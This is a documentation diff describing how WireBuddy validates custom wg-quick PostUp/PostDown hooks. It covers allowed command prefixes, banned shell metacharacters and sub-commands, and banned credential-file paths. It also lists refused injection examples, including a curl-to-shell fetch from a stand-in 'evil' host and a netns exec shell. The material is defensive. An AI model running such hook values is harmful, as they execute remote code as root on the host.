@@ -46,9 +46,35 @@ IPv6 host address is rejected because it leaves no address pool for peers.
 
 When no custom `PostUp`/`PostDown` hooks are supplied, WireBuddy detects the
 host's default outbound interface and generates iptables rules for masquerading,
-forwarding, and DNS access. Custom hooks are supported by the interface API and
-must pass server-side command validation. Review them carefully: they run with
-the container's network privileges.
+forwarding, and DNS access.
+
+### Custom hook validation
+
+Custom hooks are supported by the interface API, but `wg-quick` runs them
+through a shell as root, so they are validated strictly before they are accepted
+or written to a config file. A hook must satisfy **all** of the following:
+
+- Every command starts with `iptables`, `ip6tables`, `ip`, `sysctl`, or `nft`.
+- Commands are separated only by `;`.
+- No shell metacharacters anywhere: `` ` ``, `$`, `\`, `|`, `&`, `<`, `>`,
+  `(`, `)`, `{`, `}`, `[`, `]`, `!`, `*`, `?`, quotes, tabs, or newlines.
+- No sub-commands that can launch another program: `netns exec`, `-f`,
+  `--file`, `-c`, `--command`, `xargs`, `exec`, `eval`, `source`.
+- No `..` path traversal and no references to `/etc/passwd` or `/etc/shadow`.
+
+Rejected hooks return `422` with the offending command. Examples that are
+**refused**, because a prefix check alone would let them through:
+
+```text
+ip link show && curl http://evil/x | sh
+iptables -L | some-command
+ip netns exec ns /bin/sh
+nft -f /tmp/attacker-controlled
+```
+
+!!! warning
+    A hook that passes validation still runs with the container's network
+    privileges. Treat hook values as administrator-only, reviewed input.
 
 Open the interface's UDP listen port in every upstream host, router, and cloud
 firewall. The supplied container uses host networking, so Docker port publishing
